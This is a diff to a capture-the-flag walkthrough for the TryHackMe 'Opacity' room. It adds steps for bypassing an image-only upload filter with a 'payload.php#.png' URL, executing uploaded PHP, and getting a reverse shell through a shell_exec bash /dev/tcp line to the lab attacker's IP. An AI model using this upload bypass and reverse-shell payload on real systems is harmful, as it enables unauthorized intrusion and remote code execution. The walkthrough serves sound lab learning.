@@ -5,8 +5,6 @@ categories: [Walkthrough]
 tags: [ctf, thm, easy]     # TAG names should always be lowercase
 ---
 
-**NOT FINISHED**
-
 The room is available [here](https://tryhackme.com/room/opacity).
 
 ## Information Gathering
@@ -76,13 +74,55 @@ We find a directory `/cloud` containing a index page.
 
 ### File Upload
 
-**TODO**
+We seems to have a file upload form on the page. We try to upload a PHP file by creating a simple HTTP server with Python (`$ python -m http.server 1234`) and a simple PHP file.
+
+```php
+<?php
+phpinfo();
+?>
+```
+
+Then we provide the URL of the PHP file to the upload form.
+
+`http://10.2.34.126:1234/payload.php`
+
+Unfortunately, the upload is blocked by the server. The server is checking the file extension and only allows images file extensions.
+
+![Upload Blocked](assets/img/posts/walkthroughs/opacity/20240728_opacity_fail_upload.png)
+
+We can bypass this by using a PHP file with a valid image extension and bypassing the filter with a `#`.
+The server will only check the extension after the `#` and not interpret it when making the GET request on our server. 
+
+`payload.php#.png`
+
+We provide the new URL to the upload form.
+
+`http://10.2.34.126:1234/payload.php#.png`
+
+![Upload Success](assets/img/posts/walkthroughs/opacity/20240728_opacity_successful_upload.png)
+
+The upload is successful and we can then access the file at `http://10.10.86.31/cloud/images/payload.php`.
 
 ![phpinfo Injection](assets/img/posts/walkthroughs/opacity/20240728_opacity_phpinfo.png)
 
+As we can see, the php file is executed and we can now inject PHP code.
+(It is possible the server remove the file before you try to access it, you can try to upload it again)
+
 ### Reverse Shell
 
-**TODO**
+We can now inject a reverse shell in the PHP file after setting up a listener on our machine.
+
+```php
+<?php
+echo shell_exec("bash -c 'exec bash -i &>/dev/tcp/10.2.34.126/1235 <&1'");
+?>
+```
+
+Following the same process as before, we upload the file with the `.png` extension and access it at `http://10.10.86.31/cloud/images/payload.php`.
+
+And now we have a reverse shell on the target machine.
+
+### Local Enumeration **TODO**
 
 ```php
 <?php session_start(); /* Starts the session */
@@ -98,6 +138,8 @@ We find a directory `/cloud` containing a index page.
 ```
 
 ### Keepass Crack
+
+**TODO**
 
 ![Keepass Database](assets/img/posts/walkthroughs/opacity/20240728_opacity_keepass_crack.png)
 
